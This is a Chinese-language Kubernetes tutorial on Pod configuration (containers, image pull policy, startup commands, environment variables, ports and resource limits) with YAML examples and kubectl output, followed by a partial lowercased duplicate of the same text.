<string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在 kubernetes 中基本所有资源的一级属性都是一样的，主要包含 5 部分：\n\n * apiVersion 版本，由 kubernetes 内部定义，版本号必须可以用 kubectl api-versions 查询到\n * kind 类型，由 kubernetes 内部定义，版本号必须可以用 kubectl api-resources 查询到\n * metadata 元数据，主要是资源标识和说明，常用的有 name、namespace、labels 等\n * spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述\n * status 状态信息，里面的内容不需要定义，由 kubernetes 自动生成\n\n在上面的属性中，spec 是接下来研究的重点，继续看下它的常见子属性:\n\n * containers <[] Object> 容器列表，用于定义容器的详细信息\n * nodeName 根据 nodeName 的值将 pod 调度到指定的 Node 节点上\n * nodeSelector <map []> 根据 NodeSelector 中定义的信息选择将该 Pod 调度到包含这些 label 的 Node 上\n * hostNetwork 是否使用主机网络模式，默认为 false，如果设置为 true，表示使用宿主机网络\n * volumes <[] Object> 存储卷，用于定义 Pod 上面挂在的存储信息\n * restartPolicy 重启策略，表示 Pod 在遇到故障的时候的处理策略\n\n\n# Pod 配置\n\n主要来研究 pod.spec.containers 属性，这也是 pod 配置中最为关键的一项配置。\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nKIND:     Pod\nVERSION:  v1\nRESOURCE: containers <[]Object>   # 数组，代表可以有多个容器\nFIELDS:\n   name  <string>     # 容器名称\n   image <string>     # 容器需要的镜像地址\n   imagePullPolicy  <string> # 镜像拉取策略 \n   command  <[]string> # 容器的启动命令列表，如不指定，使用打包时使用的启动命令\n   args     <[]string> # 容器的启动命令需要的参数列表\n   env      <[]Object> # 容器环境变量的配置\n   ports    <[]Object>     # 容器需要暴露的端口号列表\n   resources <Object>      # 资源限制和资源请求的设置\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 基本配置\n\n创建 pod-base.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面定义了一个比较简单 Pod 的配置，里面有两个容器：\n\n * nginx：用 1.17.1 版本的 nginx 镜像创建，（nginx 是一个轻量级 web 容器）\n * busybox：用 1.30 版本的 busybox 镜像创建，（busybox 是一个小巧的 linux 命令集合）\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# 查看Pod状况\n# READY 1/2 : 表示当前Pod中有2个容器，其中1个准备就绪，1个未就绪\n# RESTARTS  : 重启次数，因为有1个容器故障了，Pod一直在重启试图恢复它\n[root@k8s-master01 pod]# kubectl get pod -n dev\nNAME       READY   STATUS    RESTARTS   AGE\npod-base   1/2     Running   4          95s\n\n# 可以通过describe查看内部的详情\n# 此时已经运行起来了一个基本的Pod，所以它暂时有问题\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 镜像拉取\n\n当我们的 Pod 已经拉取镜像并启动容器，其他 Pod 也需要此镜像，那么此时其他 Pod 拉取相同镜像是从镜像源拉取，还是直接使用已经拉取过的镜像？这就由 imagepullpolicy 来决定。\n\n创建 pod-imagepullpolicy.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagePullPolicy: Never # 用于设置镜像拉取策略\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagePullPolicy，用于设置镜像拉取策略，kubernetes 支持配置三种拉取策略：\n\n * Always：总是从远程仓库拉取镜像（一直远程下载）\n * IfNotPresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载）\n * Never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地）\n\n> 默认值说明:\n> 如果镜像 tag 为具体版本号， 默认策略是：IfNotPresent\n> 如果镜像 tag 为：latest（最终版本） ，默认策略是 always\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# 查看Pod详情\n# 此时明显可以看到nginx镜像有一步Pulling image "nginx:1.17.1"的过程\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nEvents:\n  Type     Reason     Age               From               Message\n  ----     ------     ----              ----               -------\n  Normal   Scheduled  <unknown>         default-scheduler  Successfully assigned dev/pod-imagePullPolicy to node1\n  Normal   Pulling    32s               kubelet, node1     Pulling image "nginx:1.17.1"\n  Normal   Pulled     26s               kubelet, node1     Successfully pulled image "nginx:1.17.1"\n  Normal   Created    26s               kubelet, node1     Created container nginx\n  Normal   Started    25s               kubelet, node1     Started container nginx\n  Normal   Pulled     7s (x3 over 25s)  kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal   Created    7s (x3 over 25s)  kubelet, node1     Created container busybox\n  Normal   Started    7s (x3 over 25s)  kubelet, node1     Started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 启动命令\n\n在 基本配置 的案例中，有一个问题没有解决，就是 busybox 容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？\n\nbusybox 并不是一个程序，而是类似于一个工具类的集合，kubernetes 集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了 command 配置。\n\n创建 pod-command.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # 容器启动成功，执行死循环\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommand，用于在 pod 中的容器初始化完毕之后运行一个命令。\n\n> 稍微解释下上面命令的意思：\n> "/bin/sh","-c", 使用 sh 执行命令\n> touch /tmp/hello.txt; 创建一个 /tmp/hello.txt 文件\n> while true;do /bin/echo $(date +% T) >> /tmp/hello.txt; sleep 3; done; 每隔 3 秒向文件中写入当前时间\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# 查看Pod状态\n# 此时发现两个pod都正常运行了\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nNAME          READY   STATUS   RESTARTS   AGE\npod-command   2/2     Runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n进入 pod 中的 busybox 容器，查看文件内容，命令如下\n\nkubectl exec  pod名称 -n 命名空间 -it -c 容器名称 /bin/sh\n\n\n1\n\n\n使用这个命令就可以进入某个容器的内部，然后进行相关操作了，比如，可以查看 txt 文件的内容。演示：\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> 特别说明：\n> 通过上面发现 command 已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个 args 选项，用于传递参数呢？这其实跟 docker 有点关系，kubernetes 中的 command、args 两项其实是实现覆盖 Dockerfile 中 ENTRYPOINT 的功能。\n> 1 如果 command 和 args 均没有写，那么用 Dockerfile 的配置。\n> 2 如果 command 写了，但 args 没有写，那么 Dockerfile 默认的配置会被忽略，执行输入的 command\n> 3 如果 command 没写，但 args 写了，那么 Dockerfile 中配置的 ENTRYPOINT 的命令会被执行，使用当前 args 的参数\n> 4 如果 command 和 args 都写了，那么 Dockerfile 的配置被忽略，执行 command 并追加上 args 参数\n\n\n# 环境变量\n\n创建 pod-env.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%T);sleep 60; done;"]\n    env: # 设置环境变量列表\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenv，环境变量，用于在 pod 中的容器设置环境变量。\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# 进入容器，输出环境变量\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。\n\n\n# 端口设置\n\n本小节来介绍容器的端口设置，也就是 containers 的 ports 选项。\n\n首先看下 ports 支持的子选项：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nKIND:     Pod\nVERSION:  v1\nRESOURCE: ports <[]Object>\nFIELDS:\n   name         <string>  # 端口名称，如果指定，必须保证name在pod中是唯一的\t\t\n   containerPort<integer> # 容器要监听的端口(0<x<65536)\n   hostPort     <integer> # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) \n   hostIP       <string>  # 要将外部端口绑定到的主机IP(一般省略)\n   protocol     <string>  # 端口协议。必须是UDP、TCP或SCTP。默认为“TCP”。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n接下来，编写一个测试案例，创建 pod-ports.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # 设置容器暴露的端口列表\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# 查看pod\n# 在下面可以明显看到配置信息\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      name: nginx-port\n      protocol: TCP\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n访问容器中的程序需要使用的是 podip:containerPort\n\n\n# 资源配额\n\n容器中的程序要运行，肯定是要占用一定资源的，比如 cpu 和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes 提供了对内存和 cpu 的资源进行配额的机制，这种机制主要通过 resources 选项实现，他有两个子选项：\n\n * limits：用于限制运行时容器的最大占用资源，当容器占用资源超过 limits 时会被终止，并进行重启\n * requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动\n\n可以通过上面两个选项设置资源的上下限。当配置了后，会自动去找合适的主机资源来启动 Pod\n\n接下来，编写一个测试案例，创建 pod-resources.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # 资源配额\n      limits:  # 限制资源（上限）\n        cpu: "2" # CPU限制，单位是core数\n        memory: "10Gi" # 内存限制\n      requests: # 请求资源（下限）\n        cpu: "1"  # CPU限制，单位是core数\n        memory: "10Mi"  # 内存限制\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n在这对 cpu 和 memory 的单位做一个说明：\n\n * cpu：core 数，可以为整数或小数\n * memory： 内存大小，可以使用 Gi、Mi、G、M 等形式\n\n# 运行Pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看发现pod运行正常\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nNAME            READY   STATUS    RESTARTS   AGE  \npod-resources   1/1     Running   0          39s   \n\n# 接下来，停止Pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# 编辑pod，修改resources.requests.memory的值为10Gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# 再次启动pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看Pod状态，发现Pod启动失败\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nNAME            READY   STATUS    RESTARTS   AGE          \npod-resources   0/1     Pending   0          20s    \n\n# 查看pod详情会发现，如下提示\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nWarning  FailedScheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 Insufficient memory.(内存不足)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',normalizedContent:'# 介绍\n\n\n# pod 结构\n\n\n\n每个 pod 中都可以包含一个或者多个容器，这些容器可以分为两类：\n\n * 用户程序所在的容器，数量可多可少\n * pause 容器，这是每个 pod 都会有的一个根容器，它的作用有两个：\n   * 可以以它为依据，评估整个 pod 的健康状态\n   * 可以在根容器上设置 ip 地址，其它容器都此 ip（pod ip），以实现 pod 内部的网路通信\n     这里是pod内部的通讯，pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是flannel\n\n\n# pod 定义\n\n下面是 pod 的资源清单：\n\napiversion: v1     #必选，版本号，例如v1\nkind: pod       　 #必选，资源类型，例如 pod\nmetadata:       　 #必选，元数据\n  name: string     #必选，pod名称\n  namespace: string  #pod所属的命名空间,默认为"default"\n  labels:       　　  #自定义标签列表\n    - name: string      　          \nspec:  #必选，pod中容器的详细定义\n  containers:  #必选，pod中容器列表\n  - name: string   #必选，容器名称\n    image: string  #必选，容器的镜像名称\n    imagepullpolicy: [ always|never|ifnotpresent ]  #获取镜像的策略 \n    command: [string]   #容器的启动命令列表，如不指定，使用打包时使用的启动命令\n    args: [string]      #容器的启动命令参数列表\n    workingdir: string  #容器的工作目录\n    volumemounts:       #挂载到容器内部的存储卷配置\n    - name: string      #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名\n      mountpath: string #存储卷在容器内mount的绝对路径，应少于512字符\n      readonly: boolean #是否为只读模式\n    ports: #需要暴露的端口库号列表\n    - name: string        #端口的名称\n      containerport: int  #容器需要监听的端口号\n      hostport: int       #容器所在主机需要监听的端口号，默认与container相同\n      protocol: string    #端口协议，支持tcp和udp，默认tcp\n    env:   #容器运行前需设置的环境变量列表\n    - name: string  #环境变量名称\n      value: string #环境变量的值\n    resources: #资源限制和请求的设置\n      limits:  #资源限制的设置\n        cpu: string     #cpu的限制，单位为core数，将用于docker run --cpu-shares参数\n        memory: string  #内存限制，单位可以为mib/gib，将用于docker run --memory参数\n      requests: #资源请求的设置\n        cpu: string    #cpu请求，容器启动的初始可用数量\n        memory: string #内存请求,容器启动的初始可用数量\n    lifecycle: #生命周期钩子\n        poststart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\n        prestop: #容器终止前执行此钩子,无论结果如何,容器都会终止\n    livenessprobe:  #对pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器\n      exec:       　 #对pod容器内检查方式设置为exec方式\n        command: [string]  #exec方式需要制定的命令或脚本\n      httpget:       #对pod内个容器健康检查方法设置为httpget，需要制定path、port\n        path: string\n        port: number\n        host: string\n        scheme: string\n        httpheaders:\n        - name: string\n          value: string\n      tcpsocket:     #对pod内个容器健康检查方式设置为tcpsocket方式\n         port: number\n       initialdelayseconds: 0       #容器启动完成后首次探测的时间，单位为秒\n       timeoutseconds: 0    　　    #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒\n       periodseconds: 0     　　    #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次\n       successthreshold: 0\n       failurethreshold: 0\n       securitycontext:\n         privileged: false\n  restartpolicy: [always | never | onfailure]  #pod的重启策略\n  nodename: <string> #设置nodename表示将该pod调度到指定到名称的node节点上\n  nodeselector: obeject #设置nodeselector表示将该pod调度到包含这个label的node上\n  imagepullsecrets: #pull镜像时使用的secret名称，以key：secretkey格式指定\n  - name: string\n  hostnetwork: false   #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络\n  volumes:   #在该pod上定义共享存储卷列表\n  - name: string    #共享存储卷名称 （volumes类型有很多种）\n    emptydir: {}       #类型为emtydir的存储卷，与pod同生命周期的一个临时目录。为空值\n    hostpath: string   #类型为hostpath的存储卷，表示挂载pod所在宿主机的目录\n      path: string      　　        #pod所在宿主机的目录，将被用于同期中mount的目录\n    secret:       　　　#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configmap:         #类型为configmap的存储卷，挂载预定义的configmap对象到容器内部\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n不知道相关的 type 有什么资源类型可写，可以通过一个命令来查看每种资源的可配置项\n\n#   kubectl explain 资源类型         查看某种资源可以配置的一级属性\n#   kubectl explain 资源类型.属性     查看属性的子属性\n[root@k8s-master01 ~]# kubectl explain pod\nkind:     pod\nversion:  v1\nfields:\n   apiversion   <string>\n   kind <string>\n   metadata     <object>\n   spec <object>\n   status       <object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nkind:     pod\nversion:  v1\nresource: metadata <object>\nfields:\n   annotations  <map[string]string>\n   clustername  <string>\n   creationtimestamp    <string>\n   deletiongraceperiodseconds   <integer>\n   deletiontimestamp    <string>\n   finalizers   <[]string>\n   generatename <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedfields        <[]object>\n   name <string>\n   namespace    <string>\n   ownerreferences      <[]object>\n   resourceversion      <string>\n   selflink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在 kubernetes 中基本所有资源的一级属性都是一样的，主要包含 5 部分：\n\n * apiversion 版本，由 kubernetes 内部定义，版本号必须可以用 kubectl api-versions 查询到\n * kind 类型，由 kubernetes 内部定义，版本号必须可以用 kubectl api-resources 查询到\n * metadata 元数据，主要是资源标识和说明，常用的有 name、namespace、labels 等\n * spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述\n * status 状态信息，里面的内容不需要定义，由 kubernetes 自动生成\n\n在上面的属性中，spec 是接下来研究的重点，继续看下它的常见子属性:\n\n * containers <[] object> 容器列表，用于定义容器的详细信息\n * nodename 根据 nodename 的值将 pod 调度到指定的 node 节点上\n * nodeselector <map []> 根据 nodeselector 中定义的信息选择将该 pod 调度到包含这些 label 的 node 上\n * hostnetwork 是否使用主机网络模式，默认为 false，如果设置为 true，表示使用宿主机网络\n * volumes <[] object> 存储卷，用于定义 pod 上面挂在的存储信息\n * restartpolicy 重启策略，表示 pod 在遇到故障的时候的处理策略\n\n\n# pod 配置\n\n主要来研究 pod.spec.containers 属性，这也是 pod 配置中最为关键的一项配置。\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nkind:     pod\nversion:  v1\nresource: containers <[]object>   # 数组，代表可以有多个容器\nfields:\n   name  <string>     # 容器名称\n   image <string>     # 容器需要的镜像地址\n   imagepullpolicy  <string> # 镜像拉取策略 \n   command  <[]string> # 容器的启动命令列表，如不指定，使用打包时使用的启动命令\n   args     <[]string> # 容器的启动命令需要的参数列表\n   env      <[]object> # 容器环境变量的配置\n   ports    <[]object>     # 容器需要暴露的端口号列表\n   resources <object>      # 资源限制和资源请求的设置\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 基本配置\n\n创建 pod-base.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面定义了一个比较简单 pod 的配置，里面有两个容器：\n\n * nginx：用 1.17.1 版本的 nginx 镜像创建，（nginx 是一个轻量级 web 容器）\n * busybox：用 1.30 版本的 busybox 镜像创建，（busybox 是一个小巧的 linux 命令集合）\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# 查看pod状况\n# ready 1/2 : 表示当前pod中有2个容器，其中1个准备就绪，1个未就绪\n# restarts  : 重启次数，因为有1个容器故障了，pod一直在重启试图恢复它\n[root@k8s-master01 pod]# kubectl get pod -n dev\nname       ready   status    restarts   age\npod-base   1/2     running   4          95s\n\n# 可以通过describe查看内部的详情\n# 此时已经运行起来了一个基本的pod，所以它暂时有问题\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 镜像拉取\n\n当我们的 pod 已经拉取镜像并启动容器，其他 pod 也需要此镜像，那么此时其他 pod 拉取相同镜像是从镜像源拉取，还是直接使用已经拉取过的镜像？这就由 imagepullpolicy 来决定。\n\n创建 pod-imagepullpolicy.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagepullpolicy: never # 用于设置镜像拉取策略\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagepullpolicy，用于设置镜像拉取策略，kubernetes 支持配置三种拉取策略：\n\n * always：总是从远程仓库拉取镜像（一直远程下载）\n * ifnotpresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载）\n * never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地）\n\n> 默认值说明:\n> 如果镜像 tag 为具体版本号， 默认策略是：ifnotpresent\n> 如果镜像 tag 为：latest（最终版本） ，默认策略是 always\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# 查看pod详情\n# 此时明显可以看到nginx镜像有一步pulling image "nginx:1.17.1"的过程\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nevents:\n  type     reason     age               from               message\n  ----     ------     ----              ----               -------\n  normal   scheduled  <unknown>         default-scheduler  successfully assigned dev/pod-imagepullpolicy to node1\n  normal   pulling    32s               kubelet, node1     pulling image "nginx:1.17.1"\n  normal   pulled     26s               kubelet, node1     successfully pulled image "nginx:1.17.1"\n  normal   created    26s               kubelet, node1     created container nginx\n  normal   started    25s               kubelet, node1     started container nginx\n  normal   pulled     7s (x3 over 25s)  kubelet, node1     container image "busybox:1.30" already present on machine\n  normal   created    7s (x3 over 25s)  kubelet, node1     created container busybox\n  normal   started    7s (x3 over 25s)  kubelet, node1     started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 启动命令\n\n在 基本配置 的案例中，有一个问题没有解决，就是 busybox 容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？\n\nbusybox 并不是一个程序，而是类似于一个工具类的集合，kubernetes 集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了 command 配置。\n\n创建 pod-command.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # 容器启动成功，执行死循环\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%t) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommand，用于在 pod 中的容器初始化完毕之后运行一个命令。\n\n> 稍微解释下上面命令的意思：\n> "/bin/sh","-c", 使用 sh 执行命令\n> touch /tmp/hello.txt; 创建一个 /tmp/hello.txt 文件\n> while true;do /bin/echo $(date +% t) >> /tmp/hello.txt; sleep 3; done; 每隔 3 秒向文件中写入当前时间\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# 查看pod状态\n# 此时发现两个pod都正常运行了\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nname          ready   status   restarts   age\npod-command   2/2     runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n进入 pod 中的 busybox 容器，查看文件内容，命令如下\n\nkubectl exec  pod名称 -n 命名空间 -it -c 容器名称 /bin/sh\n\n\n1\n\n\n使用这个命令就可以进入某个容器的内部，然后进行相关操作了，比如，可以查看 txt 文件的内容。演示：\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> 特别说明：\n> 通过上面发现 command 已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个 args 选项，用于传递参数呢？这其实跟 docker 有点关系，kubernetes 中的 command、args 两项其实是实现覆盖 dockerfile 中 entrypoint 的功能。\n> 1 如果 command 和 args 均没有写，那么用 dockerfile 的配置。\n> 2 如果 command 写了，但 args 没有写，那么 dockerfile 默认的配置会被忽略，执行输入的 command\n> 3 如果 command 没写，但 args 写了，那么 dockerfile 中配置的 entrypoint 的命令会被执行，使用当前 args 的参数\n> 4 如果 command 和 args 都写了，那么 dockerfile 的配置被忽略，执行 command 并追加上 args 参数\n\n\n# 环境变量\n\n创建 pod-env.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%t);sleep 60; done;"]\n    env: # 设置环境变量列表\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenv，环境变量，用于在 pod 中的容器设置环境变量。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# 进入容器，输出环境变量\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。\n\n\n# 端口设置\n\n本小节来介绍容器的端口设置，也就是 containers 的 ports 选项。\n\n首先看下 ports 支持的子选项：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nkind:     pod\nversion:  v1\nresource: ports <[]object>\nfields:\n   name         <string>  # 端口名称，如果指定，必须保证name在pod中是唯一的\t\t\n   containerport<integer> # 容器要监听的端口(0<x<65536)\n   hostport     <integer> # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) \n   hostip       <string>  # 要将外部端口绑定到的主机ip(一般省略)\n   protocol     <string>  # 端口协议。必须是udp、tcp或sctp。默认为“tcp”。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n接下来，编写一个测试案例，创建 pod-ports.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # 设置容器暴露的端口列表\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# 查看pod\n# 在下面可以明显看到配置信息\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagepullpolicy: ifnotpresent\n    name: nginx\n    ports:\n    - containerport: 80\n      name: nginx-port\n      protocol: 